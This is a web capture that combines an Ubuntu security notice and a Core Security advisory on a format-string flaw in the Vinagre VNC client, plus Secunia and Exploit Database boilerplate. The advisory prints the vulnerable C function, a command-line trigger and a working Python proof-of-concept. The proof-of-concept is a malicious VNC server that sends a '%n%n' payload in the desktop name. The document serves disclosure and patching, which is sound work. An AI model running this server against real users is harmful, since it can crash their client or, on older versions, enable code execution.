# USN-689-1: Vinagre vulnerability

10 December 2008

Vinagre vulnerability

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 8.10](/security/notices?release=intrepid)
* [Ubuntu 8.04](/security/notices?release=hardy)

## Packages

* [vinagre](/security/cves?package=vinagre) -

## Details

Alfredo Ortega discovered a flaw in Vinagre's use of format strings. A

remote attacker could exploit this vulnerability if they tricked a user

into connecting to a malicious VNC server, or opening a specially crafted

URI with Vinagre. In Ubuntu 8.04, it was possible to execute arbitrary

code with user privileges. In Ubuntu 8.10, Vinagre would simply abort,

leading to a denial of service.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 8.10

* [vinagre](https://launchpad.net/ubuntu/%2Bsource/vinagre)
  -
  [2.24.1-0ubuntu1.1](https://launchpad.net/ubuntu/%2Bsource/vinagre/2.24.1-0ubuntu1.1)

##### Ubuntu 8.04

* [vinagre](https://launchpad.net/ubuntu/%2Bsource/vinagre)
  -
  [0.5.1-0ubuntu1.1](https://launchpad.net/ubuntu/%2Bsource/vinagre/0.5.1-0ubuntu1.1)

After a standard system upgrade you need to restart Vinagre to effect

the necessary changes.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

      Core Security Technologies - CoreLabs Advisory
           http://www.coresecurity.com/corelabs/

Vinagre show_error() format string vulnerability

1. *Advisory Information*

Title: Vinagre show_error() format string vulnerability
Advisory ID: CORE-2008-1127
Advisory URL: http://www.coresecurity.com/content/vinagre-format-string
Date published: 2008-12-09
Date of last update: 2008-12-09
Vendors contacted: Vinagre team
Release mode: Coordinated release

2. *Vulnerability Information*

Class: Format string
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: 32682
CVE Name: N/A

3. *Vulnerability Description*

Vinagre [1] is a VNC client for the GNOME Desktop. A format string error
has been found on the 'vinagre_utils_show_error()' function that can be
exploited via commands issued from a malicious server containing format
string specifiers on the VNC name.

In a web based attack scenario, the user would be required to connect to
a malicious server. Successful exploitation would then allow the
attacker to execute arbitrary code with the privileges of the Vinagre user.

4. *Vulnerable packages*

   . Vinagre 2.24.1 and previous versions

5. *Non-vulnerable packages*

   . Vinagre 2.24.2

6. *Vendor Information, Solutions and Workarounds*

The Vinagre team has released a fixed version, available at
http://ftp.acc.umu.se/pub/GNOME/sources/vinagre/2.24/vinagre-2.24.2.tar.gz

7. *Credits*

This vulnerability was discovered and researched by Alfredo Ortega from
Core Security Technologies.

8. *Technical Description / Proof of Concept Code*

The function 'vinagre_utils_show_error()' on 'src/vinagre-utils.c' follows:

/-----------

57  void
58  vinagre_utils_show_error (const gchar *message, GtkWindow *parent)
59  {
60    GtkWidget *d;
61
62    d = gtk_message_dialog_new (parent,
63              GTK_DIALOG_MODAL | GTK_DIALOG_DESTROY_WITH_PARENT,
64              GTK_MESSAGE_ERROR,
65              GTK_BUTTONS_CLOSE,
66              message);
....

- -----------/

 Here, the "message" string is the format specifier for the function
'gtk_message_dialog_new()', but may be controlled by the user in many
ways. The simplest is the invocation of vinagre via a command line, Ex.:

/-----------

~$vinagre %n%n
- -----------/

 But the vulnerability can also be triggered remotely via a malicious
vnc server.

8.1. *Proof Of Concept*

The following python script implements a basic vnc server that triggers
the vulnerability:

/-----------

##
## Gnome Vinagre format string PoC VNC SERVER
##

import socket
import struct

#create an INET, STREAMing socket
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#bind the socket to a public host,
# and a well-known port
serversocket.bind(("0.0.0.0", 5900))

#become a server socket
serversocket.listen(5)

while 1:
  #accept connections from outside
  (clientsocket, address) = serversocket.accept()
  print "accept"

  # version handshake
  clientsocket.send("RFB 003.008\n")
  resp=clientsocket.recv(100)
  print resp

  # security types (none)
  clientsocket.send("\x01\x01")
  resp=clientsocket.recv(100)
  if resp=="\x01":
    print "security: none"
    clientsocket.send("\x00\x00\x00\x00") #OK
  else: exit(-1)

  # share desktop flag?
  resp=clientsocket.recv(100)

  #framebuffer parameters

clientsocket.send("\x02\xd0\x01\x90\x20\x20\x00\x01\x00\xff\x00\xff\x00\xff\x10\x08\x00\x00\x00\x00\x00\x00\x00\x04%n%n")
#OK

  resp=clientsocket.recv(100)
  clientsocket.close()

- -----------/

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
